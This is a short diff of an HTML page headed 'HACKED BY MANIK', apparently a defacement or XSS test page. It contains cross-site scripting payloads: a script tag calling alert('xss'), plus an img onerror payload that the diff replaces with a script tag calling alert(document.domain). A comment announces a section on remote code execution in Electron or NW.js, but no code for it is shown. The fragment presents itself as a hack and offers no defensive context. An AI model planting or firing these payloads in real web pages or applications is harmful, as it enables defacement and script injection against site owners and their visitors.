@@ -12,7 +12,8 @@
       <h1>HACKED BY MANIK</h1>
       <script>alert('xss')</script>
       <!-- XSS alert fallback -->
-      <img src=x onerror=alert(document.domain)>
+
+      <script>alert(document.domain)</script>
 
       <!-- Remote Code Execution (Electron/NW.js) -->
       
